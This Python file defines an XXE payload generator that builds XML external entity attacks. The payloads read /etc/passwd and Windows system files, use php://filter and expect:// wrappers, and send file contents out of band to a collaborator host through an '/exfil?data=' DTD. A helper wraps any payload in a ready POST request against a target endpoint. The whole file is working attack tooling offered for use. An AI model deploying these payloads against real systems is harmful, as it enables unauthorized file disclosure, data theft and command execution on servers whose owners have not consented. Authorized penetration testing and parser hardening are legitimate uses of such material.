class XXEGenerator:
    def __init__(self):
        self.payload_templates = self._load_payload_templates()
    
    def _load_payload_templates(self):
        return {
            'doctype': {
                'basic': '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % ext SYSTEM "{collaborator}/payload.dtd">
%ext;
%payload;
%exfil;
]>
<data>&exfil;</data>''',
                
                'external': '''<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "{collaborator}/xxe.dtd">
<data>&exfil;</data>'''
            },
            
            'xinclude': {
                'basic': '''<data xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="{target_url}" parse="text"/>
</data>''',
                
                'with_encoding': '''<data xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="{target_url}" parse="text" encoding="UTF-8"/>
</data>'''
            },
            
            'svg': {
                'basic': '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://id"></image>
</svg>'''
            },
            
            'dtd': {
                'external_entity': '''<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM '{collaborator}/exfil?data=%payload;'>">''',
                
                'oob_exfiltration': '''<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "{collaborator}/evil.dtd">
%dtd;
%exfil;'''
            }
        }
    
    def generate_payloads(self, target_url="", collaborator="", attack_type="all"):
        # Input validation
        valid_types = ['all', 'doctype', 'xinclude', 'dtd', 'svg']
        if attack_type not in valid_types:
            raise ValueError(f"Invalid attack_type '{attack_type}'. Must be one of: {valid_types}")
        
        payloads = []
        
        if attack_type in ['all', 'doctype']:
            payloads.extend(self._generate_doctype_payloads(collaborator))
        
        if attack_type in ['all', 'xinclude']:
            payloads.extend(self._generate_xinclude_payloads(target_url))
        
        if attack_type in ['all', 'dtd']:
            payloads.extend(self._generate_dtd_payloads(collaborator))
        
        if attack_type in ['all', 'svg']:
            payloads.extend(self._generate_svg_payloads())
        
        return payloads
    
    def _generate_doctype_payloads(self, collaborator):
        payloads = []
        
        # Basic doctype payload
        if collaborator:
            payloads.append({
                'name': 'Basic Doctype with External DTD',
                'type': 'doctype',
                'payload': self.payload_templates['doctype']['external'].format(
                    collaborator=collaborator
                ),
                'description': 'Basic XXE using external DTD'
            })
        
        # File read payloads
        file_read_payloads = [
            ('file:///etc/passwd', 'Linux /etc/passwd'),
            ('file:///c:/windows/win.ini', 'Windows win.ini'),
            ('file:///c:/boot.ini', 'Windows boot.ini'),
            ('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'PHP filter base64'),
            ('expect://id', 'Expect wrapper (if enabled)'),
        ]
        
        for file_path, description in file_read_payloads:
            payloads.append({
                'name': f'File Read: {description}',
                'type': 'doctype',
                'payload': f'''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "{file_path}">
]>
<data>&xxe;</data>''',
                'description': f'Read {description}'
            })
        
        return payloads
    
    def _generate_xinclude_payloads(self, target_url):
        payloads = []
        
        if target_url:
            for name, template in self.payload_templates['xinclude'].items():
                payloads.append({
                    'name': f'XInclude {name.capitalize()}',
                    'type': 'xinclude',
                    'payload': template.format(target_url=target_url),
                    'description': f'XInclude attack using {name} method'
                })
        
        return payloads
    
    def _generate_dtd_payloads(self, collaborator):
        payloads = []
        
        if collaborator:
            for name, template in self.payload_templates['dtd'].items():
                payloads.append({
                    'name': f'DTD {name.replace("_", " ").title()}',
                    'type': 'dtd',
                    'payload': template.format(collaborator=collaborator),
                    'description': f'DTD based attack - {name}'
                })
        
        return payloads
    
    def _generate_svg_payloads(self):
        payloads = []
        
        for name, template in self.payload_templates['svg'].items():
            payloads.append({
                'name': f'SVG {name.capitalize()}',
                'type': 'svg',
                'payload': template,
                'description': f'SVG based XXE - {name}'
            })
        
        return payloads
    
    def generate_http_request(self, payload, target_endpoint, host="target.com"):
        """Generate HTTP request with XXE payload"""
        if not payload or not target_endpoint:
            raise ValueError("Both payload and target_endpoint are required")
        
        content_length = len(payload.encode('utf-8'))
        return f"""POST {target_endpoint} HTTP/1.1
Host: {host}
Content-Type: application/xml
Content-Length: {content_length}

{payload}"""